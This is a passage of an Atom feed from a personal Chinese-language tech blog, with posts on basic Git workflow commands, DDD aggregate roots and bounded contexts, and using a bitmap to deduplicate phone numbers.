<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Anderson&#39;s blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-04-18T13:51:04.166Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Anderson Lee</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>GIT工作流</title>
    <link href="http://example.com/2022/04/18/utils/GIT%E5%B7%A5%E4%BD%9C%E6%B5%81/"/>
    <id>http://example.com/2022/04/18/utils/GIT%E5%B7%A5%E4%BD%9C%E6%B5%81/</id>
    <published>2022-04-18T13:48:48.000Z</published>
    <updated>2022-04-18T13:51:04.166Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Git工作流"><a href="#Git工作流" class="headerlink" title="Git工作流"></a>Git工作流</h2><p>下载git</p><figure class="highlight sh"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs sh">sudo apt install git<br></code></pre></td></tr></table></figure><p>git 初始化</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">git init<br></code></pre></td></tr></table></figure><p>添加文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">touch</span> temp.txt<br></code></pre></td></tr></table></figure><p>把文件上传到本地</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">git add *<br></code></pre></td></tr></table></figure><p>配置用户名和user.name和邮箱user.email</p><img src="/2022/04/18/utils/GIT%E5%B7%A5%E4%BD%9C%E6%B5%81/image-20220418094737302.png" class><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ git config --global user.name <span class="hljs-string">&quot;Your Name&quot;</span><br>$ git config --global user.email <span class="hljs-string">&quot;email@example.com&quot;</span><br></code></pre></td></tr></table></figure><p>git commit -m “commit context”   这里提交必须加 -m , -m 后面跟的是提交说明</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sh">anderson@anderson:~/gittemp$ git status <br>On branch master<br><br>No commits yet<br><br>Changes to be committed:<br>  (use <span class="hljs-string">&quot;git rm --cached &lt;file&gt;...&quot;</span> to unstage)<br>new file:   txt.txt<br><br>anderson@anderson:~/gittemp$ git commit <span class="hljs-string">&quot;my first commit&quot;</span><br>error: pathspec <span class="hljs-string">&#x27;my first commit&#x27;</span> did not match any file(s) known to git<br>anderson@anderson:~/gittemp$ git commit -m <span class="hljs-string">&quot;my first commit&quot;</span><br>[master (root-commit) f0a9bbe] my first commit<br> 1 file changed, 0 insertions(+), 0 deletions(-)<br> create mode 100644 txt.txt<br><br></code></pre></td></tr></table></figure><p>git log 可以查看历史操作用于版本回退</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">anderson@anderson:~/gittemp$ git log<br>commit 134669f1a29a38a25b852c24fa02d48602f59346 (HEAD -&gt; master)<br>Author: anderson &lt;2095357740@qq.com&gt;<br>Date:   Mon Apr 18 02:12:33 2022 +0000<br><br>    add a new file<br><br>commit ee8141c4e442c06548dd5f2951602ef062ed3f74<br>Author: anderson &lt;2095357740@qq.com&gt;<br>Date:   Mon Apr 18 02:10:13 2022 +0000<br><br>    my second commit<br><br>commit f0a9bbe0fedf117dea64055f4d5c40ae7d58fa1d<br>Author: anderson &lt;2095357740@qq.com&gt;<br>Date:   Mon Apr 18 01:49:58 2022 +0000<br><br></code></pre></td></tr></table></figure><h3 id="版本回退"><a href="#版本回退" class="headerlink" title="版本回退"></a>版本回退</h3><p>git reset  id</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs sh">anderson@anderson:~/gittemp$ git reset ee8141c4e442c06548dd5f2951602ef062ed3f74<br>anderson@anderson:~/gittemp$ git <span class="hljs-built_in">log</span><br>commit ee8141c4e442c06548dd5f2951602ef062ed3f74 (HEAD -&gt; master)<br>Author: anderson &lt;2095357740@qq.com&gt;<br>Date:   Mon Apr 18 02:10:13 2022 +0000<br><br>    my second commit<br><br>commit f0a9bbe0fedf117dea64055f4d5c40ae7d58fa1d<br>Author: anderson &lt;2095357740@qq.com&gt;<br>Date:   Mon Apr 18 01:49:58 2022 +0000<br><br>    my first commit<br><br></code></pre></td></tr></table></figure><p>这里reset 后面跟id就可以回到相应的版本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sh">anderson@anderson:~/gittemp$ git status <br>On branch master<br>Untracked files:<br>  (use <span class="hljs-string">&quot;git add &lt;file&gt;...&quot;</span> to include <span class="hljs-keyword">in</span> what will be committed)<br>new.txt<br><br>nothing added to commit but untracked files present (use <span class="hljs-string">&quot;git add&quot;</span> to track)<br><br></code></pre></td></tr></table></figure><p>可以看到git确实回退了，new.txt已经不在本地仓库里面</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">git reset --hard HEAD^<br></code></pre></td></tr></table></figure><p>这是回退到上一个版本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">git reflog<br></code></pre></td></tr></table></figure><img src="/2022/04/18/utils/GIT%E5%B7%A5%E4%BD%9C%E6%B5%81/image-20220418103012443.png" class><p>查看历史版本情况</p><h3 id="添加远程仓库"><a href="#添加远程仓库" class="headerlink" title="添加远程仓库"></a>添加远程仓库</h3><p>一定一定一定先配置ssh</p><p><a href="https://blog.csdn.net/m0_46223011/article/details/123025422">https://blog.csdn.net/m0_46223011/article/details/123025422</a></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">git remote add origin git@github.com:andersonlee09/gitskills.git<br></code></pre></td></tr></table></figure><p>这一步是让本地去关联远程仓库</p><p>下一步，就可以把本地库的所有内容推送到远程库上：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs sh">anderson@anderson:~/gittemp$ git remote add origin git@github.com:andersonlee09/gitskills.git<br>fatal: remote origin already exists.<br>anderson@anderson:~/gittemp$ git push -u origin master<br>Enumerating objects: 10, <span class="hljs-keyword">done</span>.<br>Counting objects: 100% (10/10), <span class="hljs-keyword">done</span>.<br>Delta compression using up to 2 threads<br>Compressing objects: 100% (6/6), <span class="hljs-keyword">done</span>.<br>Writing objects: 100% (10/10), 844 bytes | 422.00 KiB/s, <span class="hljs-keyword">done</span>.<br>Total 10 (delta 0), reused 0 (delta 0)<br>remote: <br>remote: Create a pull request <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;master&#x27;</span> on GitHub by visiting:<br>remote:      https://github.com/andersonlee09/gitskills/pull/new/master<br>remote: <br>To github.com:andersonlee09/gitskills.git<br> * [new branch]      master -&gt; master<br>Branch <span class="hljs-string">&#x27;master&#x27;</span> <span class="hljs-built_in">set</span> up to track remote branch <span class="hljs-string">&#x27;master&#x27;</span> from <span class="hljs-string">&#x27;origin&#x27;</span>.<br><br></code></pre></td></tr></table></figure><h3 id="分支管理"><a href="#分支管理" class="headerlink" title="分支管理"></a>分支管理</h3><p>创建分支</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">git checkout -b dev<br></code></pre></td></tr></table></figure><p>切换分支</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh">anderson@anderson:~/gittemp$ git checkout -b dev<br>Switched to a new branch <span class="hljs-string">&#x27;dev&#x27;</span><br>anderson@anderson:~/gittemp$ git branch dev<br>fatal: A branch named <span class="hljs-string">&#x27;dev&#x27;</span> already exists.<br>anderson@anderson:~/gittemp$ git branch <br>* dev<br>  master<br></code></pre></td></tr></table></figure><p>dev 提交远程仓库</p><p>一定要先在远程仓库添加git branch</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">git remote add dev git@github.com:andersonlee09/gitskills.git<br>git push dev master<br></code></pre></td></tr></table></figure><p>切回master</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">git checkout master<br><br>git merge dev<br></code></pre></td></tr></table></figure><p>切换到master合并dev</p><h3 id="rebase"><a href="#rebase" class="headerlink" title="rebase"></a>rebase</h3><p>rebase的作用简要概括为：可以对某一段线性提交历史进行编辑、删除、复制、粘贴；因此，合理使用rebase命令可以使我们的提交历史干净、简洁！</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sh">anderson@anderson:~/gittemp$ git <span class="hljs-built_in">log</span> --oneline <br>bce7577 (HEAD -&gt; master) commit rebase3.txt<br>e2bab7e commit rebase2.txt<br>7dbb0d6 commit rebase1.txt<br>092d22f (dev) commit devrich.txt<br>c2c9d68 (origin/master, dev/master) last commit...<br>134669f add a new file<br>ee8141c my second commit<br>f0a9bbe my first commit<br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">git rebase -<span class="hljs-selector-tag">i</span>  <span class="hljs-selector-attr">[startpoint]</span>  <span class="hljs-selector-attr">[endpoint]</span><br></code></pre></td></tr></table></figure><p>该区间指定的是一个前开后闭的区间</p><img src="/2022/04/18/utils/GIT%E5%B7%A5%E4%BD%9C%E6%B5%81/image-20220418125217575.png" class><p>pick：保留该commit（缩写:p）</p><p>reword：保留该commit，但我需要修改该commit的注释（缩写:r）</p><p>edit：保留该commit, 但我要停下来修改该提交(不仅仅修改注释)（缩写:e）</p><p>squash：将该commit和前一个commit合并（缩写:s）</p><p>fixup：将该commit和前一个commit合并，但我不要保留该提交的注释信息（缩写:f）</p><p>exec：执行shell命令（缩写:x）</p><p>drop：我要丢弃该commit（缩写:d)</p><p><strong>把上面的pick全部改为s</strong>，也就是合并到上一个</p><img src="/2022/04/18/utils/GIT%E5%B7%A5%E4%BD%9C%E6%B5%81/image-20220418130110409.png" class><p>可以看到它确实与上一个合并了</p><img src="/2022/04/18/utils/GIT%E5%B7%A5%E4%BD%9C%E6%B5%81/image-20220418130014291.png" class><p>写入的位置</p><h3 id="diff"><a href="#diff" class="headerlink" title="diff"></a>diff</h3><p>git 比较两个版本的差异：git diff 版本号1 版本号2</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sh">anderson@anderson:~/gittemp$ git diff 7dbb0d6 ee8141c<br>diff --git a/dev.txt b/dev.txt<br>deleted file mode 100644<br>index e69de29..0000000<br>diff --git a/devrich.txt b/devrich.txt<br>deleted file mode 100644<br>index e69de29..0000000<br>diff --git <span class="hljs-string">&quot;a/id\t\b\b\b\b&quot;</span> <span class="hljs-string">&quot;b/id\t\b\b\b\b&quot;</span><br>deleted file mode 100644<br>index 994c725..0000000<br>--- <span class="hljs-string">&quot;a/id\t\b\b\b\b&quot;</span><br>+++ /dev/null<br></code></pre></td></tr></table></figure><p>git 比较两个分支之间的差异</p><p>git diff branch1 branch2</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sh">anderson@anderson:~/gittemp$ git diff master dev<br>diff --git a/rebase1.txt b/rebase1.txt<br>deleted file mode 100644<br>index e69de29..0000000<br>diff --git a/rebase2.txt b/rebase2.txt<br>deleted file mode 100644<br>index e69de29..0000000<br>diff --git a/rebase3.txt b/rebase3.txt<br>deleted file mode 100644<br>index e69de29..0000000<br></code></pre></td></tr></table></figure><p>end…</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Git工作流&quot;&gt;&lt;a href=&quot;#Git工作流&quot; class=&quot;headerlink&quot; title=&quot;Git工作流&quot;&gt;&lt;/a&gt;Git工作流&lt;/h2&gt;&lt;p&gt;下载git&lt;/p&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td </summary>
      
    
    
    
    <category term="utils" scheme="http://example.com/categories/utils/"/>
    
    
    <category term="GIT" scheme="http://example.com/tags/GIT/"/>
    
  </entry>
  
  <entry>
    <title>DDD入门五板斧（四）聚合根And限界上下文</title>
    <link href="http://example.com/2022/04/05/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E5%9B%9B%EF%BC%89%E8%81%9A%E5%90%88%E6%A0%B9And%E9%99%90%E7%95%8C%E4%B8%8A%E4%B8%8B%E6%96%87/"/>
    <id>http://example.com/2022/04/05/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E5%9B%9B%EF%BC%89%E8%81%9A%E5%90%88%E6%A0%B9And%E9%99%90%E7%95%8C%E4%B8%8A%E4%B8%8B%E6%96%87/</id>
    <published>2022-04-05T10:15:43.000Z</published>
    <updated>2022-04-05T13:53:05.238Z</updated>
    
    <content type="html"><![CDATA[<p>现在让我们去假设一个场景：</p><p>一个用户想要注销自己的微信账号，那他所关联的钱包银行卡联系人等关系应该如何处理？如果银行卡是两个人共同使用，那删除一个以后是否会影响其他人的使用？也就是说：一个对象的修改常常会影响其他的对象，那怎样让对象关系保持一致？这是一个问题</p><img src="/2022/04/05/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E5%9B%9B%EF%BC%89%E8%81%9A%E5%90%88%E6%A0%B9And%E9%99%90%E7%95%8C%E4%B8%8A%E4%B8%8B%E6%96%87/image-20220405201212276.png" class><p>我们可以用Aggregate去表示这样一个引用关系的集合，也就是说<strong>聚合是对存在引用关系的一组对象的封装</strong>，它的目的就是屏蔽掉内部对象之间复杂的关联关系，只对外去暴露统一接口</p><h3 id="根对象与边界"><a href="#根对象与边界" class="headerlink" title="根对象与边界"></a>根对象与边界</h3><img src="/2022/04/05/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E5%9B%9B%EF%BC%89%E8%81%9A%E5%90%88%E6%A0%B9And%E9%99%90%E7%95%8C%E4%B8%8A%E4%B8%8B%E6%96%87/image-20220405201803603.png" class><p>关于聚合我们需要去关注它的两个属性：<strong>根对象</strong>&amp;<strong>边界</strong>，根对象是整个聚合中唯一能被外部引用的对象，也就是说：聚合所暴露的接口，只允许操作根对象，根对象是一个Entity，因为每个对象需要ID和状态来区分其他聚合，所以这里就是通过根对象的ID来作为整个聚合的ID</p><p>另一个概念：边界，简单来说聚合的边界就是你判断哪些对象，可以被放入当前聚合的条件</p><img src="/2022/04/05/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E5%9B%9B%EF%BC%89%E8%81%9A%E5%90%88%E6%A0%B9And%E9%99%90%E7%95%8C%E4%B8%8A%E4%B8%8B%E6%96%87/image-20220405202259361.png" class><p>下面我们对于注销银行卡这个事件来进行分析，该聚合的边界就是<strong>进行账号注销时，当前对象是否被引用</strong>？比如聊天消息对象，当账号被注销的时候，他与其他对象的聊天信息并不用被清空，所以聊天消息并不能通过边界进入这个聚合，这个聚合的根对象又是什么？因为注销的是账号，所以根对象就是账号对象，聚合外部可以持有根对象的引用来操作聚合，而聚合内部来通过一系列的逻辑来保持各个对象的状态的一致性</p><img src="/2022/04/05/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E5%9B%9B%EF%BC%89%E8%81%9A%E5%90%88%E6%A0%B9And%E9%99%90%E7%95%8C%E4%B8%8A%E4%B8%8B%E6%96%87/image-20220405203204480.png" class><p>我们知道，每个Entity都是存在标识的，标识一般是不可变的类型，这里定义了一个Identifier接口，用于所有作为标识的DP的公共父接口，也就是说不建议直接使用String类型来作为Entity的标识，建议使用DP来作为Entity的标识</p><p>接下来定义Entity接口，它的泛型是Identifier的子类，该泛型指定了Entity的标识类型，也就是实现了Identifier接口的DP,比如最早的PhoneNumber作为一个DP实现了Identifier接口,它是唯一的。注意：<strong>并不是所有的DP都是作为标识的</strong>，比如这里的Red,聚合根是Entity,所以这里的聚合根集成了Entity,和Entity一样，聚合根也需要一个标识，所以这里指定泛型为Identifier的子类。</p><p>这里定义了一个WeChatAccount,它是一个Entity,WeChatAccount的泛型为phoneNumber,这意味着手机账号是每个微信用户的全局标识，在账号操作这个业务聚合中，它能够充当被外部引用的根</p><img src="/2022/04/05/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E5%9B%9B%EF%BC%89%E8%81%9A%E5%90%88%E6%A0%B9And%E9%99%90%E7%95%8C%E4%B8%8A%E4%B8%8B%E6%96%87/image-20220405204544242.png" class><p>假如现在微信需要完成一个转账的业务：这里需要的对象有：余额、钱包、微信账号。这三个对象都是Entity，其中WeChatAccount是聚合根。这里三个类都加上了私有的无参构造器，这就是为了拒绝通过new来构造对象，而是通过工厂来构造标准的对象，这里的转账涉及到了多个Entity的变化，我们简单设计一个domain service</p><img src="/2022/04/05/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E5%9B%9B%EF%BC%89%E8%81%9A%E5%90%88%E6%A0%B9And%E9%99%90%E7%95%8C%E4%B8%8A%E4%B8%8B%E6%96%87/image-20220405204942050.png" class><p>在TransferServiceImpl注入了 数据操作对象repository，这里的逻辑大概就是付款方付钱，收款方收钱。最后保存数据。我们来关注一下付款方</p><img src="/2022/04/05/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E5%9B%9B%EF%BC%89%E8%81%9A%E5%90%88%E6%A0%B9And%E9%99%90%E7%95%8C%E4%B8%8A%E4%B8%8B%E6%96%87/image-20220405205243518.png" class><p>这里的付款方付钱涉及多个对象的操作，WeChatAccount对象作为一个聚合根，它的引用能被外部获取和使用，而Wallet对象处于这个聚合的内部，它的引用只允许被内部对象所持有，不允许被外部持有，所以transferService只会持有WeChatAccount类型的数据</p><img src="/2022/04/05/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E5%9B%9B%EF%BC%89%E8%81%9A%E5%90%88%E6%A0%B9And%E9%99%90%E7%95%8C%E4%B8%8A%E4%B8%8B%E6%96%87/image-20220405205701618.png" class><p>通过去操作聚合根，简洁又安全的实现了聚合中所有的关联对象在运行时的一致，此外，在对象进行持久化时，如果我也需要只操作聚合根，那就太方便了，这就体现了DDD的思想，<strong>在业务层，开发者只用去关注领域的逻辑，而不用去关心如何将对象和数据库进行映射</strong>，也就是拒绝面向数据表增删查改</p><img src="/2022/04/05/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E5%9B%9B%EF%BC%89%E8%81%9A%E5%90%88%E6%A0%B9And%E9%99%90%E7%95%8C%E4%B8%8A%E4%B8%8B%E6%96%87/image-20220405210129552.png" class><p>这里的repository作为数据的操作组件，屏蔽了上层的业务逻辑和下次的数据库实现，通过repository就可以只操作聚合根来实现关联对象在持久化状态一致，所以我们应该对repository有如下类定义：</p><p>repository的泛型有两个，一个是AggregateRoot的子类，另一个是AggregateRoot的标识类型，代表repository能够接受和处理的聚合根以及聚合根的标识。</p><p>AccountRepository将是repository接口的子接口，它处理的聚合根类型是WeChatAccount，WeChatAccount的标识类型PhoneNumber,通过上面的分析，我们知道当用户进行转账的时候，涉及账号对象、钱包对象、余额对象明细对象的变化，AccountRepository的find方法就是通过手机号对象去查找    整个聚合，save方法则是进行持久化当前聚合中所有对象的状态</p><p>Entity是对业务领域的建模，而不是对于数据表的映射，PO才是对数据表的映射建模， 所以Entity与PO之间可能存在一对一、多对一的关系</p><img src="/2022/04/05/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E5%9B%9B%EF%BC%89%E8%81%9A%E5%90%88%E6%A0%B9And%E9%99%90%E7%95%8C%E4%B8%8A%E4%B8%8B%E6%96%87/image-20220405211942438.png" class><p>比如这里的余额对象很有可能分为可用余额与冻结余额，这一定会存储于两个数据库当中</p><img src="/2022/04/05/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E5%9B%9B%EF%BC%89%E8%81%9A%E5%90%88%E6%A0%B9And%E9%99%90%E7%95%8C%E4%B8%8A%E4%B8%8B%E6%96%87/image-20220405212111743.png" class><p>我们先来看一下WeAccountRepostoryImpl的save方法，我们知道WeChatAccount是充血模型，比如在它的类定义中，我们重点去关注wallet属性和NickName属性，假如一个用户想要修改昵称，在nickName这个DP被修改以后，也会去调用WechatAccountRepostory的save方法去保存数据，而save会把WechatAccount的所有对象数据保存一遍，而这是不必要的，但是此时我们不知道哪个对象被修改，哪些没有被修改，不用去保存</p><p>我们可以去记录聚合对象中每个对象的版本号，如果被修改，版本号自增，在save的时候检查版本号，对于这些对象进行切面代理，当这些对象被修改的时候就对这个对象进行标记，当save的时候去检查标记。</p><p>####总结</p><p>聚合的价值就是通过封装来保持所以关联对象关系的一致性，聚合的两个关键属性为<strong>根对象</strong>&amp;<strong>边界</strong>，领域方法通过持有聚合维护了对象的一致</p><p>最后我们希望每次持久化的时候保持最小化原则</p><h3 id="Bound-Context-限界上下文"><a href="#Bound-Context-限界上下文" class="headerlink" title="Bound-Context(限界上下文)"></a>Bound-Context(限界上下文)</h3><img src="/2022/04/05/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E5%9B%9B%EF%BC%89%E8%81%9A%E5%90%88%E6%A0%B9And%E9%99%90%E7%95%8C%E4%B8%8A%E4%B8%8B%E6%96%87/image-20220405213544406.png" class><p>它是为了解决复杂系统的领域分治问题，这不仅仅是DDD架构需要去面临和解决的问题，最清晰的方式就是拆分为微服务，拆分为微服务本身就存在边界问题，有些领域本身就适合去作为一个集合，由一个系统去提供，而不是去拆分为微服务，所以如何在一个系统进行领域分治这是一个问题，DDD就是通过Bound-Context思想来实现领域分治</p><p>假如一个支付系统提供了支付、退款、冻结和解冻四个服务</p><img src="/2022/04/05/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E5%9B%9B%EF%BC%89%E8%81%9A%E5%90%88%E6%A0%B9And%E9%99%90%E7%95%8C%E4%B8%8A%E4%B8%8B%E6%96%87/image-20220405214836730.png" class><h4 id="领域隔离"><a href="#领域隔离" class="headerlink" title="领域隔离"></a>领域隔离</h4><p>支付与退款领域都需要去承担支付单这个Entity,但是两个可能侧重点有所不同，在一个BC中的改动这样会很安全</p><h4 id="模型隔离"><a href="#模型隔离" class="headerlink" title="模型隔离"></a>模型隔离</h4><p>当一个系统变得庞大，或者经历了长时间的迭代，在几代开发人员的修改与维护下内部可能会有多套模型、多代架构， 它们往往目前处于共同运行状态，甚至共用一套代码，我们目标是通过一套老模型去迁移一套新模型，假如冻结这个领域三套模型应该使用BC去隔离起来，模型之间交叉的地方通过实现转换器来适配，这样在开发人员无法对多套模型的运作都很熟悉的情况下，在对一套模型进行修改将会是相对安全的</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;现在让我们去假设一个场景：&lt;/p&gt;
&lt;p&gt;一个用户想要注销自己的微信账号，那他所关联的钱包银行卡联系人等关系应该如何处理？如果银行卡是两个人共同使用，那删除一个以后是否会影响其他人的使用？也就是说：一个对象的修改常常会影响其他的对象，那怎样让对象关系保持一致？这是一个问题&lt;</summary>
      
    
    
    
    <category term="DDD" scheme="http://example.com/categories/DDD/"/>
    
    
    <category term="DDD" scheme="http://example.com/tags/DDD/"/>
    
  </entry>
  
  <entry>
    <title>BitMap</title>
    <link href="http://example.com/2022/04/05/Java%E9%9B%86%E5%90%88/BitMap/"/>
    <id>http://example.com/2022/04/05/Java%E9%9B%86%E5%90%88/BitMap/</id>
    <published>2022-04-05T03:23:35.000Z</published>
    <updated>2022-04-05T03:51:10.407Z</updated>
    
    <content type="html"><![CDATA[<p>现在假设我们遇到了一个问题：现在移动公司非常多的电话号码，大概有40亿个，现在我们需要对这些电话号码进行去重应该怎样去操作？这里最多使用1G内存</p><h3 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h3><p>第一个就是排序法，我们对于电话号码排好序，然后每个与前一个比较就可以了，这是一个比较靠谱的方法，但是太慢了，排序的时间复杂度的O（nlogn）</p><h3 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h3><p>对于HashMap,我们可以键值对分别为Integer和Boolean,实际要存40亿电话号码，1G的内存够分配这么多空间吗?显然不行。一个Integer12个字节，Boolean至少一个字节，这样就是（12+1）*40亿 B</p><h3 id="BitMap"><a href="#BitMap" class="headerlink" title="BitMap"></a>BitMap</h3><p>我们可以对hashmap进行优化，采用bitmap这种数据结构，可以顺利地同时解决时间问题和空间问题。</p><img src="/2022/04/05/Java%E9%9B%86%E5%90%88/BitMap/image-20220405113614596.png" class><p>这是一个unsigned char类型，可以看到，共有8位，取值范围是[0, 255]，如上这个unsigned char的值是255，它能标识0~7这些数字都存在。</p><p>同理，如下这个unsigned char类型的值是254，它对应的含义是：1~7这些数字存在，而数字0不存在：</p><img src="/2022/04/05/Java%E9%9B%86%E5%90%88/BitMap/image-20220405113704861.png" class><p>由此可见，一个unsigned char类型的数据，可以标识0~7这8个整数的存在与否。以此类推：</p><ul><li>一个unsigned int类型数据可以标识0~31这32个整数的存在与否。</li><li>两个unsigned int类型数据可以标识0~63这64个整数的存在与否。</li></ul><p>也就是说：<strong>一个字节可以表示8个数字是否存在</strong>，相对于以前的直接表示，4个字节才可以直接表示一个数字，这样子就节省了至少32倍的内存</p><p>512MB &#x3D; 512 * 2^20 B &#x3D; 2 ^ 29 B </p><p>而这些内存可以表示2 ^ 32次方个数字的表示</p><p>显然，可以推导出来：512MB大小足够标识所有电话号码的存在与否，请注意：电话号码的理论最大值为2^32 - 1，大概是43亿左右。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;现在假设我们遇到了一个问题：现在移动公司非常多的电话号码，大概有40亿个，现在我们需要对这些电话号码进行去重应该怎样去操作？这里最多使用1G内存&lt;/p&gt;
&lt;h3 id=&quot;排序&quot;&gt;&lt;a href=&quot;#排序&quot; class=&quot;headerlink&quot; title=&quot;排序&quot;&gt;&lt;/a&gt;</summary>
      
    
    
    
    <category term="Java集合" scheme="http://example.com/categories/Java%E9%9B%86%E5%90%88/"/>
    
    
    <category term="Java集合" scheme="http://example.com/tags/Java%E9%9B%86%E5%90%88/"/>
    
    <category term="BitMap" scheme="http://example.com/tags/BitMap/"/>
    
  </entry>
  
  <entry>
